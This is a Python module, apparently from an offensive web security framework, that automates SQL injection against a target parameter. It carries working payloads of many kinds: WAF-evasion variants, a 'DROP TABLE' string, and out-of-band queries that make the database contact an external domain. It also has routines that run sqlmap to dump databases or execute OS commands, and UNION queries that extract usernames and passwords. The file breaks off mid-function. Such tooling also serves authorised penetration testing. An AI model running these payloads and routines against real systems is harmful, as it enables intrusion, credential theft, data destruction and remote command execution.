#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATOMIC FRAMEWORK - SQL Injection Module
Advanced SQLi detection and exploitation

Includes native detection techniques and optional sqlmap CLI integration
for deeper automated exploitation when sqlmap is installed on the system.
"""

import os
import re
import shutil
import subprocess
import tempfile
import time


from config import Payloads, Colors


class SQLiModule:
    """SQL Injection Testing Module"""

    def __init__(self, engine):
        self.engine = engine
        self.requester = engine.requester
        self.name = "SQL Injection"

        # SQL Error signatures
        self.error_signatures = {
            "mysql": [
                "you have an error in your sql syntax",
                "mysql_fetch_array",
                "mysql_fetch_row",
                "mysql_num_rows",
                "mysql_query",
                "mysqli_",
                "warning: mysql",
                "mysqli_error",
                "quoted string not properly terminated",
                "unknown column '",
            ],
            "postgresql": [
                "pg_query",
                "pg_exec",
                "postgresql",
                "psql",
                "syntax error at or near",
                "warning: pg_",
            ],
            "mssql": [
                "microsoft sql",
                "mssql",
                "sql server",
                "odbc sql server driver",
                "unclosed quotation mark",
                "incorrect syntax near",
            ],
            "oracle": [
                "ora-",
                "oracle",
                "ora_error",
                "quoted string not properly terminated",
                "sql command not properly ended",
            ],
            "sqlite": [
                "sqlite_query",
                "sqlite3",
                'near ".*": syntax error',
                "unrecognized token",
            ],
            "generic": [
                "sql syntax",
                "sqlstate[",
                "jdbc exception",
                "odbc sql server driver",
            ],
            "mariadb": ["mariadb server", "mariadb error"],
            "cockroachdb": ["cockroachdb", "crdb_internal"],
            "clickhouse": ["clickhouse", "code: 62"],
        }

    def test(self, url: str, method: str, param: str, value: str):
        """Test for SQL Injection"""
        # Test error-based SQLi
        self._test_error_based(url, method, param, value)

        # Test time-based SQLi
        self._test_time_based(url, method, param, value)

        # Test union-based SQLi
        self._test_union_based(url, method, param, value)

        # Test boolean-based SQLi
        self._test_boolean_based(url, method, param, value)

        # Test stacked queries SQLi
        self._test_stacked_queries(url, method, param, value)

        # Test second-order SQLi
        self._test_second_order(url, method, param, value)

        # Test out-of-band SQLi
        self._test_oob_sqli(url, method, param, value)

        # Test WAF bypass payloads
        self._test_waf_bypass_payloads(url, method, param, value)

        # LLM-generated adaptive payloads (if --local-llm active)
        self._test_llm_payloads(url, method, param, value)

        # sqlmap deep scan (optional, requires sqlmap installed)
        if self.engine.config.get("modules", {}).get("sqlmap", False):
            self._test_sqlmap(url, method, param, value)

    def test_url(self, url: str):
        """Test URL for SQLi"""
        pass  # URL-based tests handled by parameter tests

    def _test_error_based(self, url: str, method: str, param: str, value: str):
        """Test for error-based SQLi"""
        payloads = Payloads.SQLI_ERROR_BASED

        # Get baseline response to filter pre-existing error strings
        try:
            baseline_data = {param: value}
            baseline_response = self.requester.request(url, method, data=baseline_data)
            baseline_text = baseline_response.text.lower() if baseline_response else ""
        except Exception:
            baseline_text = ""

        # Apply WAF bypass if enabled
        if self.engine.config.get("waf_bypass"):
            all_payloads = []
            for p in payloads:
                all_payloads.extend(self.requester.waf_bypass_encode(p))
            payloads = list(set(all_payloads))

        for payload in payloads:
            try:
                data = {param: payload}
                response = self.requester.request(url, method, data=data)

                if not response:
                    continue

                # Check for SQL errors
                response_text = response.text.lower()
                detected_db = None
                matched_sig = None

                for db_type, signatures in self.error_signatures.items():
                    for sig in signatures:
                        sig_lower = sig.lower()
                        # Only flag if the error signature is NEW (not in baseline)
                        if sig_lower in response_text and sig_lower not in baseline_text:
                            detected_db = db_type
                            matched_sig = sig
                            break
                    if detected_db:
                        break

                if detected_db:
                    from core.engine import Finding

                    finding = Finding(
                        technique=f"SQL Injection ({detected_db.upper()})",
                        url=url,
                        severity="HIGH",
                        confidence=0.9,
                        param=param,
                        payload=payload,
                        evidence=f"Database error detected: {detected_db} (signature: {matched_sig})",
                    )
                    self.engine.add_finding(finding)
                    return

            except Exception as e:
                if self.engine.config.get("verbose"):
                    print(f"{Colors.error(f'SQLi test error: {e}')}")

    def _test_time_based(self, url: str, method: str, param: str, value: str):
        """Test for time-based blind SQLi"""
        payloads = Payloads.SQLI_TIME_BASED

        # Measure baseline response time first
        try:
            baseline_data = {param: value}
            baseline_start = time.time()
            self.requester.request(url, method, data=baseline_data)
            baseline_time = time.time() - baseline_start
        except Exception:
            baseline_time = 0

        for payload in payloads:
            try:
                data = {param: payload}

                start_time = time.time()
                self.requester.request(url, method, data=data)
                elapsed = time.time() - start_time

                # Response must take significantly longer than baseline
                # and at least 4.8s (for SLEEP(5) payloads)
                if elapsed >= 4.8 and elapsed > baseline_time + 4.0:
                    # Confirmation retry: send the same payload again to reduce
                    # false positives caused by transient network latency.
                    try:
                        confirm_start = time.time()
                        self.requester.request(url, method, data=data)
                        confirm_elapsed = time.time() - confirm_start
                    except Exception:
                        confirm_elapsed = 0

                    if confirm_elapsed >= 4.8 and confirm_elapsed > baseline_time + 4.0:
                        from core.engine import Finding

                        finding = Finding(
                            technique="SQL Injection (Time-based Blind)",
                            url=url,
                            severity="HIGH",
                            confidence=0.8,
                            param=param,
                            payload=payload,
                            evidence=f"Response delayed by {elapsed:.2f}s, confirmed {confirm_elapsed:.2f}s (baseline: {baseline_time:.2f}s)",
                        )
                        self.engine.add_finding(finding)
                        return

            except Exception as e:
                if self.engine.config.get("verbose"):
                    print(f"{Colors.error(f'Time-based SQLi test error: {e}')}")

    def _test_union_based(self, url: str, method: str, param: str, value: str):
        """Test for UNION-based SQLi"""
        Payloads.SQLI_UNION_BASED

        # Get baseline response for comparison
        try:
            baseline_data = {param: value}
            baseline = self.requester.request(url, method, data=baseline_data)
            baseline_text = baseline.text if baseline else ""
        except Exception:
            baseline_text = ""

        # Test with incrementing column count
        for i in range(1, 10):
            try:
                nulls = ",".join(["NULL"] * i)
                payload = f"' UNION SELECT {nulls} --"

                data = {param: payload}
                response = self.requester.request(url, method, data=data)

                if not response:
                    continue

                # Check if UNION was successful (no error and different response)
                if response.status_code == 200:
                    response_text = response.text

                    # Response must differ from baseline (UNION added data)
                    if abs(len(response_text) - len(baseline_text)) < 20:
                        continue

                    # Check for database-specific info in response that was NOT in baseline
                    db_patterns = [
                        r"mysql|postgresql|mssql|oracle|sqlite",
                        r"ubuntu|debian|centos|redhat",
                    ]

                    for pattern in db_patterns:
                        match = re.search(pattern, response_text, re.IGNORECASE)
                        if match and match.group(0).lower() not in baseline_text.lower():
                            from core.engine import Finding

                            finding = Finding(
                                technique="SQL Injection (UNION-based)",
                                url=url,
                                severity="CRITICAL",
                                confidence=0.85,
                                param=param,
                                payload=payload,
                                evidence=f"UNION query returned new data: {match.group(0)}",
                            )
                            self.engine.add_finding(finding)
                            return

            except Exception as e:
                if self.engine.config.get("verbose"):
                    print(f"{Colors.error(f'UNION SQLi test error: {e}')}")

    def _test_boolean_based(self, url: str, method: str, param: str, value: str):
        """Test for boolean-based blind SQLi with 3x consistency verification.

        To avoid false positives caused by dynamic page content (ads, CSRF
        tokens, timestamps), each payload pair is tested three times and the
        response lengths are checked for consistency before declaring a
        finding.
        """
        try:
            # Get baseline response
            baseline_data = {param: value}
            baseline = self.requester.request(url, method, data=baseline_data)

            if not baseline:
                return

            baseline_len = len(baseline.text)

            # Payload pairs: (true_payload, false_payload)
            payload_pairs = [
                (f"{value}' AND '1'='1", f"{value}' AND '1'='2"),
                (f"{value}' AND 1=1 #", f"{value}' AND 1=2 #"),
                (f"{value}' AND 'a'='a", f"{value}' AND 'a'='b"),
            ]

            for true_payload, false_payload in payload_pairs:
                # --- 3x consistency check ---
                true_lengths = []
                false_lengths = []

                for _ in range(3):
                    true_data = {param: true_payload}
                    true_response = self.requester.request(url, method, data=true_data)

                    false_data = {param: false_payload}
                    false_response = self.requester.request(url, method, data=false_data)

                    if not true_response or not false_response:
                        break
                    true_lengths.append(len(true_response.text))
                    false_lengths.append(len(false_response.text))

                if len(true_lengths) < 3 or len(false_lengths) < 3:
                    continue

                # All true responses must be consistent with each other
                if not self._lengths_consistent(true_lengths):
                    continue
                # All false responses must be consistent with each other
                if not self._lengths_consistent(false_lengths):
                    continue

                avg_true = sum(true_lengths) / 3
                avg_false = sum(false_lengths) / 3

                # TRUE and FALSE must differ significantly
                diff_true_false = abs(avg_true - avg_false)
                max_len = max(avg_true, avg_false, 1)
                pct_diff = diff_true_false / max_len

                # TRUE response should be close to baseline (same page)
                diff_baseline_true = abs(baseline_len - avg_true)

                if pct_diff > 0.25 and diff_baseline_true < diff_true_false:
                    from core.engine import Finding

                    finding = Finding(
                        technique="SQL Injection (Boolean-based Blind)",
                        url=url,
                        severity="HIGH",
                        confidence=0.85,
                        param=param,
                        payload=true_payload,
                        evidence=(
                            f"Consistent 3x difference: TRUE avg={avg_true:.0f}, "
                            f"FALSE avg={avg_false:.0f} ({pct_diff:.1%} diff)"
                        ),
                    )
                    self.engine.add_finding(finding)
                    return

        except Exception as e:
            if self.engine.config.get("verbose"):
                print(f"{Colors.error(f'Boolean SQLi test error: {e}')}")

    @staticmethod
    def _lengths_consistent(
        lengths: list[int], tolerance_pct: float = 0.08,
    ) -> bool:
        """Check if all lengths are within *tolerance_pct* of each other."""
        if not lengths:
            return False
        avg = sum(lengths) / len(lengths)
        if avg == 0:
            return all(length == 0 for length in lengths)
        return all(abs(length - avg) / avg <= tolerance_pct for length in lengths)

    def _test_stacked_queries(self, url: str, method: str, param: str, value: str):
        """Test for stacked query SQL injection.

        Uses ``Payloads.SQLI_STACKED`` payloads and checks for both SQL
        error signatures and time-based delays (for ``pg_sleep`` payloads).
        Error signatures are compared against a baseline response to avoid
        false positives from pre-existing database-related text.
        """
        payloads = Payloads.SQLI_STACKED

        # Get baseline for error-signature filtering and timing
        try:
            baseline_data = {param: value}
            baseline_start = time.time()
            baseline_resp = self.requester.request(url, method, data=baseline_data)
            baseline_time = time.time() - baseline_start
            baseline_text = baseline_resp.text.lower() if baseline_resp else ""
        except Exception:
            baseline_time = 0
            baseline_text = ""

        for payload in payloads:
            try:
                data = {param: payload}

                start_time = time.time()
                response = self.requester.request(url, method, data=data)
                elapsed = time.time() - start_time

                if not response:
                    continue

                # Check for SQL error signatures NEW in this response
                response_text = response.text.lower()
                detected_db = None

                for db_type, signatures in self.error_signatures.items():
                    for sig in signatures:
                        sig_lower = sig.lower()
                        if sig_lower in response_text and sig_lower not in baseline_text:
                            detected_db = db_type
                            break
                    if detected_db:
                        break

                if detected_db:
                    from core.engine import Finding

                    finding = Finding(
                        technique="SQL Injection (Stacked Queries)",
                        url=url,
                        severity="CRITICAL",
                        confidence=0.85,
                        param=param,
                        payload=payload,
                        evidence=f"Stacked query triggered {detected_db} error",
                    )
                    self.engine.add_finding(finding)
                    return

                # Check for time-based detection (pg_sleep payloads)
                if "pg_sleep" in payload and elapsed >= 4.8 and elapsed > baseline_time + 4.0:
                    # Confirmation retry to reduce false positives
                    try:
                        confirm_start = time.time()
                        self.requester.request(url, method, data=data)
                        confirm_elapsed = time.time() - confirm_start
                    except Exception:
                        confirm_elapsed = 0

                    if confirm_elapsed >= 4.8 and confirm_elapsed > baseline_time + 4.0:
                        from core.engine import Finding

                        finding = Finding(
                            technique="SQL Injection (Stacked Queries)",
                            url=url,
                            severity="CRITICAL",
                            confidence=0.80,
                            param=param,
                            payload=payload,
                            evidence=f"Stacked pg_sleep delayed response by {elapsed:.2f}s, confirmed {confirm_elapsed:.2f}s (baseline: {baseline_time:.2f}s)",
                        )
                        self.engine.add_finding(finding)
                        return

            except Exception as e:
                if self.engine.config.get("verbose"):
                    print(f"{Colors.error(f'Stacked query SQLi test error: {e}')}")

    def _test_second_order(self, url: str, method: str, param: str, value: str):
        """Test for second-order SQL injection.

        Injects a payload via the original endpoint and then checks
        secondary endpoints for SQL error signatures that would indicate
        the stored payload was executed in a different query context.
        Baseline responses are collected for each secondary endpoint
        **before** injection to filter out pre-existing error strings.
        """
        payloads = ["admin'--", "' OR '1'='1", "'; DROP TABLE test--"]
        secondary_endpoints = ["/profile", "/account", "/dashboard"]

        from urllib.parse import urlparse

        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        # Collect baselines for each secondary endpoint BEFORE injection
        endpoint_baselines: dict[str, str] = {}
        for endpoint in secondary_endpoints:
            try:
                check_url = f"{base_url}{endpoint}"
                resp = self.requester.request(check_url, "GET")
                endpoint_baselines[endpoint] = resp.text.lower() if resp else ""
            except Exception:
                endpoint_baselines[endpoint] = ""

        for payload in payloads:
            try:
                data = {param: payload}
                self.requester.request(url, method, data=data)

                for endpoint in secondary_endpoints:
                    try:
                        check_url = f"{base_url}{endpoint}"
                        response = self.requester.request(check_url, "GET")

                        if not response:
                            continue

                        response_text = response.text.lower()
                        ep_baseline = endpoint_baselines.get(endpoint, "")

                        for db_type, signatures in self.error_signatures.items():
                            for sig in signatures:
                                sig_lower = sig.lower()
                                # Only flag if the error signature is NEW
                                if sig_lower in response_text and sig_lower not in ep_baseline:
                                    from core.engine import Finding

                                    finding = Finding(
                                        technique="SQL Injection (Second-Order)",
                                        url=url,
                                        severity="HIGH",
                                        confidence=0.75,
                                        param=param,
                                        payload=payload,
                                        evidence=f"New SQL error on {endpoint} after injecting into {param}: {sig}",
                                    )
                                    self.engine.add_finding(finding)
                                    return
                    except Exception:
                        continue

            except Exception as e:
                if self.engine.config.get("verbose"):
                    print(f"{Colors.error(f'Second-order SQLi test error: {e}')}")

    def _test_oob_sqli(self, url: str, method: str, param: str, value: str):
        """Test for out-of-band (OOB) SQL injection.

        Sends payloads that attempt to trigger DNS or HTTP requests to an
        external domain.  OOB findings require external listener verification,
        so payloads are only sent if a real OOB domain is configured (not the
        default placeholder).  No finding is produced without listener
        confirmation.
        """
        oob_domain = self.engine.config.get("oob_domain", "oob.example.com")

        # Do not report findings with placeholder domain — no way to verify
        if oob_domain == "oob.example.com":
            return

        # Get baseline for error-signature comparison
        try:
            baseline_data = {param: value}
            baseline_resp = self.requester.request(url, method, data=baseline_data)
            baseline_text = baseline_resp.text.lower() if baseline_resp else ""
        except Exception:
            baseline_text = ""

        payloads = [
            f"' UNION SELECT LOAD_FILE('\\\\\\\\{oob_domain}\\\\share\\\\file') --",
            f"'; EXEC master..xp_dirtree '\\\\\\\\{oob_domain}\\\\test' --",
            f"' UNION SELECT UTL_HTTP.REQUEST('http://{oob_domain}/exfil') FROM dual --",
            f"'; COPY (SELECT '') TO PROGRAM 'nslookup {oob_domain}' --",
        ]

        for payload in payloads:
            try:
                data = {param: payload}
                response = self.requester.request(url, method, data=data)

                if not response:
                    continue

                # Only report if the OOB payload triggered a NEW SQL error
                # (indicates the query was parsed but we can't confirm exfiltration)
                response_text = response.text.lower()
                for db_type, signatures in self.error_signatures.items():
                    for sig in signatures:
                        sig_lower = sig.lower()
                        if sig_lower in response_text and sig_lower not in baseline_text:
                            from core.engine import Finding

                            finding = Finding(
                                technique="SQL Injection (OOB Exfiltration)",
                                url=url,
                                severity="MEDIUM",
                                confidence=0.5,
                                param=param,
                                payload=payload,
                                evidence=f"OOB payload triggered {db_type} error; verify on {oob_domain} listener",
                            )
                            self.engine.add_finding(finding)
                            return

            except Exception as e:
                if self.engine.config.get("verbose"):
                    print(f"{Colors.error(f'OOB SQLi test error: {e}')}")

    def _test_waf_bypass_payloads(self, url: str, method: str, param: str, value: str):
        """Test for SQL injection using WAF bypass techniques.

        Uses obfuscated payloads that employ inline comments, case
        alternation, double URL-encoding, and comment splitting to evade
        web application firewalls.  When a specific WAF type has been
        detected, WAF-specific bypass variants are also generated.
        Error signatures are compared against a baseline to avoid
        false positives.
        """
        # Get baseline for error-signature filtering
        try:
            baseline_data = {param: value}
            baseline_resp = self.requester.request(url, method, data=baseline_data)
            baseline_text = baseline_resp.text.lower() if baseline_resp else ""
        except Exception:
            baseline_text = ""

        base_payloads = [
            "' /*!UNION*/ /*!SELECT*/ NULL,NULL,NULL --",
            "' uNiOn SeLeCt NULL,NULL,NULL --",
            "' %2527%2520UNION%2520SELECT%2520NULL--",
            "' UN/**/ION SEL/**/ECT NULL,NULL,NULL --",
        ]

        # Expand with WAF-specific bypasses when WAF type is known
        payloads = list(base_payloads)
        waf_module = getattr(self.engine, "waf_module", None)
        detected_wafs = getattr(self.engine, "detected_wafs", [])
        if waf_module and detected_wafs:
            for waf_type in detected_wafs:
                for bp in base_payloads:
                    try:
                        waf_variants = waf_module.waf_specific_bypasses(bp, waf_type)
                        payloads.extend(waf_variants)
                    except Exception:
                        pass
        # Also use general bypass_techniques when WAF bypass is enabled
        if self.engine.config.get("waf_bypass"):
            for bp in base_payloads:
                payloads.extend(self.requester.waf_bypass_encode(bp))

        # De-duplicate while preserving order
        seen = set()
        unique_payloads = []
        for p in payloads:
            if p not in seen:
                seen.add(p)
                unique_payloads.append(p)

        for payload in unique_payloads:
            try:
                data = {param: payload}
                response = self.requester.request(url, method, data=data)

                if not response:
                    continue

                response_text = response.text.lower()
                for db_type, signatures in self.error_signatures.items():
                    for sig in signatures:
                        sig_lower = sig.lower()
                        # Only flag if the error signature is NEW
                        if sig_lower in response_text and sig_lower not in baseline_text:
                            from core.engine import Finding

                            finding = Finding(
                                technique="SQL Injection (WAF Bypass)",
                                url=url,
                                severity="HIGH",
                                confidence=0.85,
                                param=param,
                                payload=payload,
                                evidence=f"WAF bypass successful, {db_type} error detected",
                            )
                            self.engine.add_finding(finding)
                            return

            except Exception as e:
                if self.engine.config.get("verbose"):
                    print(f"{Colors.error(f'WAF bypass SQLi test error: {e}')}")

    # ------------------------------------------------------------------
    # sqlmap CLI integration
    # ------------------------------------------------------------------

    @staticmethod
    def _find_sqlmap() -> str:
        """Return the sqlmap executable path or empty string if not found."""
        # Check PATH first
        path = shutil.which("sqlmap")
        if path:
            return path
        # Common installation directories
        for candidate in [
            "/usr/bin/sqlmap",
            "/usr/local/bin/sqlmap",
            "/usr/share/sqlmap/sqlmap.py",
            os.path.expanduser("~/.local/bin/sqlmap"),
            os.path.expanduser("~/sqlmap/sqlmap.py"),
        ]:
            if os.path.isfile(candidate) and os.access(candidate, os.X_OK):
                return candidate
        # Try as Python module
        for candidate in [
            os.path.expanduser("~/sqlmap/sqlmap.py"),
            "/usr/share/sqlmap/sqlmap.py",
            "/opt/sqlmap/sqlmap.py",
        ]:
            if os.path.isfile(candidate):
                return candidate
        return ""

    def _test_llm_payloads(self, url: str, method: str, param: str, value: str):
        """Test with LLM-generated adaptive payloads.

        Uses Qwen2.5-7B (when available via ``--local-llm``) to generate
        context-aware SQL injection payloads tailored to the detected
        technology stack and WAF.  Falls back silently when the LLM is
        not loaded.
        """
        ai = getattr(self.engine, "ai", None)
        if ai is None:
            return
        llm_payloads = ai.get_llm_payloads("sqli", param)
        if not llm_payloads:
            return

        for payload in llm_payloads:
            try:
                data = {param: payload}
                response = self.requester.request(url, method, data=data)
                if not response:
                    continue

                response_text = response.text.lower()

                # Check for SQL errors (same logic as error-based)
                detected_db = None
                for db_type, signatures in self.error_signatures.items():
                    for sig in signatures:
                        if sig.lower() in response_text:
                            detected_db = db_type
                            break
                    if detected_db:
                        break

                if detected_db:
                    from core.engine import Finding

                    finding = Finding(
                        technique=f"SQL Injection - AI-generated ({detected_db.upper()})",
                        url=url,
                        severity="HIGH",
                        confidence=0.85,
                        param=param,
                        payload=payload,
                        evidence=f"AI payload triggered {detected_db} error",
                    )
                    self.engine.add_finding(finding)
                    return

            except Exception as e:
                if self.engine.config.get("verbose"):
                    print(f"{Colors.error(f'LLM SQLi test error: {e}')}")

    def _test_sqlmap(self, url: str, method: str, param: str, value: str):
        """Run sqlmap against a specific parameter for deep SQL injection testing.

        sqlmap is executed as a subprocess with ``--batch`` (non-interactive)
        and ``--output-dir`` pointing to a temporary directory.  Results are
        parsed from the JSON/CSV output and converted into Findings.

        Gracefully skips if sqlmap is not installed.
        """
        sqlmap_bin = self._find_sqlmap()
        if not sqlmap_bin:
            if self.engine.config.get("verbose"):
                print(f"{Colors.warning('sqlmap not found — skipping sqlmap integration')}")
            return

        results = self.sqlmap_scan(
            url,
            param,
            method=method,
            value=value,
            sqlmap_bin=sqlmap_bin,
            extra_args=self._build_sqlmap_extra_args(),
        )
        for r in results:
            from core.engine import Finding

            self.engine.add_finding(Finding(**r))

    def _build_sqlmap_extra_args(self) -> list:
        """Build extra sqlmap CLI arguments from engine config."""
        args = []
        proxy = self.engine.config.get("proxy")
        if proxy:
            args.extend(["--proxy", proxy])
        if self.engine.config.get("tor"):
            args.append("--tor")
        timeout = self.engine.config.get("timeout", 15)
        args.extend(["--timeout", str(timeout)])
        evasion = self.engine.config.get("evasion", "none")
        if evasion in ("high", "insane"):
            args.extend(["--tamper", "between,randomcase,space2comment"])
            args.extend(["--level", "5", "--risk", "3"])
        elif evasion == "medium":
            args.extend(["--tamper", "space2comment"])
            args.extend(["--level", "3", "--risk", "2"])
        else:
            args.extend(["--level", "2", "--risk", "1"])
        return args

    def sqlmap_scan(
        self,
        url: str,
        param: str,
        *,
        method: str = "GET",
        value: str = "",
        sqlmap_bin: str = "",
        extra_args: list = None,
        timeout: int = 120,
    ) -> list:
        """Execute sqlmap and return a list of Finding-compatible dicts.

        Parameters
        ----------
        url : str
            Target URL.
        param : str
            Parameter to test.
        method : str
            HTTP method (GET or POST).
        value : str
            Current parameter value (used to build the target URL).
        sqlmap_bin : str
            Path to the sqlmap binary.  Auto-detected if empty.
        extra_args : list
            Additional CLI arguments forwarded to sqlmap.
        timeout : int
            Maximum seconds to wait for sqlmap to finish.

        Returns
        -------
        list[dict]
            Each dict is suitable for ``Finding(**d)``.
        """
        if not sqlmap_bin:
            sqlmap_bin = self._find_sqlmap()
        if not sqlmap_bin:
            return []

        findings = []
        tmpdir = tempfile.mkdtemp(prefix="atomic_sqlmap_")

        try:
            # Build the target URL with the parameter
            if method.upper() == "GET":
                separator = "&" if "?" in url else "?"
                target_url = f"{url}{separator}{param}={value}"
                cmd = [sqlmap_bin, "-u", target_url, "-p", param]
            else:
                target_url = url
                cmd = [
                    sqlmap_bin,
                    "-u",
                    target_url,
                    "--data",
                    f"{param}={value}",
                    "-p",
                    param,
                    "--method",
                    method.upper(),
                ]

            cmd.extend(
                [
                    "--batch",  # non-interactive
                    "--output-dir",
                    tmpdir,  # output to temp dir
                    "--flush-session",  # fresh session
                    "--smart",  # smart mode
                    "--threads",
                    "4",
                ]
            )

            if extra_args:
                cmd.extend(extra_args)

            # If sqlmap_bin ends with .py, prepend python interpreter
            if sqlmap_bin.endswith(".py"):
                cmd = ["python3", *cmd]

            if self.engine.config.get("verbose"):
                cmd_preview = " ".join(cmd[:6])
                print(f"{Colors.info(f'Running sqlmap: {cmd_preview}...')}")

            proc = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout,
            )

            output = proc.stdout + proc.stderr
            findings = self._parse_sqlmap_output(output, url, param)

            # Also try to parse log files in output dir
            findings.extend(self._parse_sqlmap_log_dir(tmpdir, url, param))

        except subprocess.TimeoutExpired:
            if self.engine.config.get("verbose"):
                print(f"{Colors.warning('sqlmap timed out')}")
        except FileNotFoundError:
            if self.engine.config.get("verbose"):
                print(f"{Colors.warning('sqlmap binary not found at execution time')}")
        except Exception as e:
            if self.engine.config.get("verbose"):
                print(f"{Colors.error(f'sqlmap error: {e}')}")
        finally:
            # Clean up temp directory
            try:
                import shutil as _shutil

                _shutil.rmtree(tmpdir, ignore_errors=True)
            except Exception:
                pass

        return findings

    def _parse_sqlmap_output(self, output: str, url: str, param: str) -> list:
        """Parse sqlmap stdout/stderr for injection confirmations."""
        findings = []

        # Detect confirmed injection types from sqlmap output
        injection_patterns = [
            (r"Type:\s*(\w[\w\s\-]+)", "technique"),
            (r"Title:\s*(.+)", "title"),
            (r"Payload:\s*(.+)", "payload"),
        ]

        current = {}
        for line in output.splitlines():
            line = line.strip()
            for pattern, key in injection_patterns:
                match = re.search(pattern, line, re.IGNORECASE)
                if match:
                    current[key] = match.group(1).strip()
                    break

            # When we have a complete set, emit a finding
            if "technique" in current and "payload" in current:
                technique = current.get("technique", "Unknown")
                title = current.get("title", technique)
                payload = current.get("payload", "")

                severity = "CRITICAL"
                if "time-based" in technique.lower() or "blind" in technique.lower():
                    severity = "HIGH"

                findings.append(
                    {
                        "technique": f"SQL Injection (sqlmap: {title})",
                        "url": url,
                        "severity": severity,
                        "confidence": 0.95,
                        "param": param,
                        "payload": payload,
                        "evidence": f"sqlmap confirmed: {technique}",
                    }
                )
                current = {}

        # Check for database type detection
        db_match = re.search(
            r"back-end DBMS:\s*(.+)",
            output,
            re.IGNORECASE,
        )
        if db_match and not findings:
            findings.append(
                {
                    "technique": f"SQL Injection (sqlmap: {db_match.group(1).strip()})",
                    "url": url,
                    "severity": "HIGH",
                    "confidence": 0.90,
                    "param": param,
                    "payload": "",
                    "evidence": f"sqlmap detected DBMS: {db_match.group(1).strip()}",
                }
            )

        return findings

    def _parse_sqlmap_log_dir(self, tmpdir: str, url: str, param: str) -> list:
        """Parse sqlmap's log directory for detailed results."""
        findings = []
        try:
            from urllib.parse import urlparse

            hostname = urlparse(url).hostname or "unknown"
            log_file = os.path.join(tmpdir, hostname, "log")
            if not os.path.isfile(log_file):
                return findings

            with open(log_file, "r") as f:
                content = f.read()

            # Parse each injection block
            blocks = re.split(r"---\n", content)
            for block in blocks:
                if "Parameter:" not in block:
                    continue
                param_match = re.search(r"Parameter:\s*(.+)", block)
                type_match = re.search(r"Type:\s*(.+)", block)
                title_match = re.search(r"Title:\s*(.+)", block)
                payload_match = re.search(r"Payload:\s*(.+)", block)

                if type_match:
                    technique = type_match.group(1).strip()
                    title = title_match.group(1).strip() if title_match else technique
                    payload = payload_match.group(1).strip() if payload_match else ""
                    p_name = param_match.group(1).strip() if param_match else param

                    findings.append(
                        {
                            "technique": f"SQL Injection (sqlmap: {title})",
                            "url": url,
                            "severity": "CRITICAL",
                            "confidence": 0.95,
                            "param": p_name,
                            "payload": payload,
                            "evidence": f"sqlmap log confirmed: {technique}",
                        }
                    )
        except Exception:
            pass
        return findings

    def sqlmap_dump(
        self,
        url: str,
        param: str,
        *,
        method: str = "GET",
        value: str = "",
        db: str = "",
        table: str = "",
        timeout: int = 300,
    ) -> list:
        """Use sqlmap to dump database contents.

        Returns a list of dicts extracted from the sqlmap CSV dump output.
        """
        sqlmap_bin = self._find_sqlmap()
        if not sqlmap_bin:
            return []

        tmpdir = tempfile.mkdtemp(prefix="atomic_sqlmap_dump_")
        results = []

        try:
            if method.upper() == "GET":
                separator = "&" if "?" in url else "?"
                target_url = f"{url}{separator}{param}={value}"
                cmd = [sqlmap_bin, "-u", target_url, "-p", param]
            else:
                cmd = [
                    sqlmap_bin,
                    "-u",
                    url,
                    "--data",
                    f"{param}={value}",
                    "-p",
                    param,
                ]

            cmd.extend(["--batch", "--output-dir", tmpdir, "--threads", "4"])
            cmd.append("--dump")

            if db:
                cmd.extend(["-D", db])
            if table:
                cmd.extend(["-T", table])

            if sqlmap_bin.endswith(".py"):
                cmd = ["python3", *cmd]

            subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout,
            )

            # Parse CSV dump files from output dir
            from urllib.parse import urlparse

            hostname = urlparse(url).hostname or "unknown"
            dump_dir = os.path.join(tmpdir, hostname, "dump")
            if os.path.isdir(dump_dir):
                for root, _dirs, files in os.walk(dump_dir):
                    for fname in files:
                        if fname.endswith(".csv"):
                            fpath = os.path.join(root, fname)
                            try:
                                with open(fpath, "r") as f:
                                    lines = f.readlines()
                                if len(lines) > 1:
                                    headers = lines[0].strip().split(",")
                                    for row in lines[1:]:
                                        vals = row.strip().split(",")
                                        entry = {}
                                        for i, h in enumerate(headers):
                                            entry[h] = vals[i] if i < len(vals) else ""
                                        results.append(entry)
                            except Exception:
                                pass
        except subprocess.TimeoutExpired:
            if self.engine.config.get("verbose"):
                print(f"{Colors.warning('sqlmap dump timed out')}")
        except Exception as e:
            if self.engine.config.get("verbose"):
                print(f"{Colors.error(f'sqlmap dump error: {e}')}")
        finally:
            try:
                import shutil as _shutil

                _shutil.rmtree(tmpdir, ignore_errors=True)
            except Exception:
                pass

        return results

    def sqlmap_os_shell(
        self, url: str, param: str, command: str, *, method: str = "GET", value: str = "", timeout: int = 120
    ) -> str:
        """Execute an OS command via sqlmap's --os-cmd feature.

        Returns the command output or empty string on failure.
        """
        sqlmap_bin = self._find_sqlmap()
        if not sqlmap_bin:
            return ""

        try:
            if method.upper() == "GET":
                separator = "&" if "?" in url else "?"
                target_url = f"{url}{separator}{param}={value}"
                cmd = [sqlmap_bin, "-u", target_url, "-p", param]
            else:
                cmd = [
                    sqlmap_bin,
                    "-u",
                    url,
                    "--data",
                    f"{param}={value}",
                    "-p",
                    param,
                ]

            cmd.extend(["--batch", "--os-cmd", command])

            if sqlmap_bin.endswith(".py"):
                cmd = ["python3", *cmd]

            proc = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout,
            )

            # Extract command output from sqlmap stdout
            output_lines = []
            capture = False
            for line in proc.stdout.splitlines():
                if "command standard output" in line.lower():
                    capture = True
                    continue
                if capture:
                    if line.strip() == "---":
                        break
                    output_lines.append(line)

            return "\n".join(output_lines).strip() if output_lines else proc.stdout

        except subprocess.TimeoutExpired:
            return ""
        except Exception:
            return ""

    def exploit_dump_database(self, url: str, param: str, db_type: str = "mysql"):
        """Attempt to dump database"""
        print(f"{Colors.info(f'Attempting to dump {db_type} database...')}")

        if db_type == "mysql":
            queries = [
                "' UNION SELECT null,schema_name,null FROM information_schema.schemata --",
                "' UNION SELECT null,table_name,null FROM information_schema.tables WHERE table_schema=database() --",
                "' UNION SELECT null,column_name,null FROM information_schema.columns WHERE table_name='users' --",
                "' UNION SELECT null,concat(username,':',password),null FROM users --",
            ]
        elif db_type == "postgresql":
            queries = [
                "' UNION SELECT null,datname,null FROM pg_database --",
                "' UNION SELECT null,tablename,null FROM pg_tables --",
            ]
        else:
            queries = []

